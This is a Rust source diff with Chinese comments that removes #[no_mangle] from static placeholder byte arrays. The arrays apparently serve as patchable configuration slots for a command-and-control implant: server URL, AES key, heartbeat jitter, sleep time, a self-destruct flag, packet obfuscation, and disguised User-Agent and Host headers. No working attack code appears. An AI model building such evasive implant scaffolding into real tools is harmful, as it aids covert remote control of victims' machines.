@@ -15,12 +15,10 @@ pub const OBFUSCATION_MODE: &str = "REPLACE_ME_OBF";
 pub const JITTER: &str = "REPLACE_ME_JITTER";
 
 ///服务器 URL 模板 (64 字节)
-#[no_mangle]
 #[used]
 pub static SERVER_URL_TEMPLATE: [u8; 64] = *b"SYSTEM_CONFIG_DATA_SERVICE_PROVIDER_MAPPING_ENDPOINT_SLOT_000001";
 
 /// AES-256 密钥模板 (32 字节)
-#[no_mangle]
 #[used]
 pub static AES_KEY_TEMPLATE: [u8; 32] = *b"SYSTEM_CONFIG_DATA_ENCRYPT_BLOB_";
 
@@ -28,47 +26,38 @@ pub static AES_KEY_TEMPLATE: [u8; 32] = *b"SYSTEM_CONFIG_DATA_ENCRYPT_BLOB_";
 pub const ENCRYPT_MODE: &str = "AES-GCM";
 
 /// 心跳间隔模板 (22 字节)
-#[no_mangle]
 #[used]
 pub static HEARTBEAT_INTERVAL_TEMPLATE: [u8; 22] = *b"HB_DATA_INT_VAL_000010";
 
 /// 自毁模式模板 (18 字节)
-#[no_mangle]
 #[used]
 pub static AUTO_DESTRUCT_TEMPLATE: [u8; 18] = *b"AD_DATA_BOOL_VAL_N";
 
 /// 休眠延时模板 (16 字节)
-#[no_mangle]
 #[used]
 pub static SLEEP_TIME_TEMPLATE: [u8; 16] = *b"ST_DATA_INT_0000";
 
 /// DNS 解析器模板 (64 字节)
-#[no_mangle]
 #[used]
 pub static DNS_RESOLVER_TEMPLATE: [u8; 64] = *b"SYSTEM_NETWORK_STUB_RESOLVER_64_PLACEHOLDER_XXXXXXXXXXXXXXXXXXXX";
 
 /// 加密盐模板 (32 字节)
-#[no_mangle]
 #[used]
 pub static ENCRYPTION_SALT_TEMPLATE: [u8; 32] = *b"SYSTEM_PROVIDER_CRYPTO_KDF_SALT_";
 
 /// 心跳抖动 (Jitter) 模板 (16 字节) - 0 到 100 之间的百分比
-#[no_mangle]
 #[used]
 pub static JITTER_TEMPLATE: [u8; 16] = *b"JT_DATA_INT_0030";
 
 /// 报文混淆模式模板 (15 字节)
-#[no_mangle]
 #[used]
 pub static PACKET_OBFUSCATION_TEMPLATE: [u8; 15] = *b"OBF_MODE_STRICT";
 
 /// User-Agent 伪装模板 (128 字节)
-#[no_mangle]
 #[used]
 pub static UA_TEMPLATE: [u8; 128] = *b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36XXXXXXXXXXXXXXXXX";
 
 /// Host 域名伪装模板 (64 字节)
-#[no_mangle]
 #[used]
 pub static HOST_TEMPLATE: [u8; 64] = *b"SYSTEM_CONFIG_DATA_HOST_MAPPING_PLACEHOLDER_XXXXXXXXXXXXXXXXXXXX";
 
